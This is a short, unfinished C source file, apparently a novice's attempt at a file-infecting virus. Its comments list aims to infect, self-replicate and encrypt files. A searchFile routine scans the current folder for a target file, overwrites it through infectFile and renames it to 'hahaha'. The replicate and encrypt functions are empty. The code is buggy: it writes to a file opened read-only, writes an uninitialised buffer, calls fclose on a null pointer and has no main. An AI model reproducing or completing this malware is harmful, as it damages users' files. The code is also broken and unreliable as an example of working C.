#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string.h>
#define MAX_LEN 255
#define BUFFER_LEN 1024
//something is really strange here

// 3 main thing about a virus
// + infect


// Copy itself
void replicate(){


}

void encryptFile(){
  

}




int infectFile(char *f_name){
  //read the file 

  char buffer[BUFFER_LEN];
  FILE *f = fopen(f_name,"r");
  // if file getting error 
  if(f == NULL){
    printf("File is shit");
    
    // After read the file, encrypt the content, or change the
    // write to the file
  }else{
    printf("[*] Infected %s\n",f_name);

    // Should we read the file or we just fuck all the file

    fwrite(buffer,sizeof(buffer),1,f);
    printf("%s\n",buffer);
  }
  fclose(f);
  return 0;
}



int searchFile(){
  DIR *d;
  struct dirent *dir;
  // file extention
  char * fileInfect[MAX_LEN] = {".txt",".docx"};
  // Open the currently standing folder
  d = opendir(".");

  if(d < 0){
    exit(1);
  }
  if(d){
    while((dir = readdir(d))!=NULL){
      // TODO should name something.txt to an array of name
      if(strcmp(dir->d_name, "something.txt") == 0){
        infectFile(dir->d_name);

        rename(dir->d_name,"hahaha");
      }
    }
    closedir(d);  
  }

  // Exit successfully
  return 0;
}
